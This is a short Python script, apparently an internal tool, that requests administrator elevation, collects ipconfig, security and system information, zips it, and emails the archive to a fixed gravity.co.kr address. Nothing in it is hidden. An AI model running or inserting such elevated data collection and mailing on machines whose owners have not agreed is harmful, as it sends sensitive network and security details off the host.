from antigravity.collect import collect_data
from antigravity.mail import send_mail
from antigravity.tools import is_encoded, to_utf8, get_datas, zip_file
from antigravity.uac_require import uac_require

if uac_require():
    IPCONFIG_PATH, SECURITY_PATH, SYS_INFO_PATH = collect_data()

    to_utf8(IPCONFIG_PATH, is_encoded(IPCONFIG_PATH))
    to_utf8(SECURITY_PATH, is_encoded(SECURITY_PATH))
    to_utf8(SYS_INFO_PATH, is_encoded(SYS_INFO_PATH))

    datas = get_datas(IPCONFIG_PATH)

    file_path = [IPCONFIG_PATH, SECURITY_PATH, SYS_INFO_PATH]

    zip_name = zip_file('.\\logs', f'{datas[0]}_{datas[1]}')

    send_mail(to_ad='aidenlee@gravity.co.kr', file_path=[zip_name], body_text=datas)
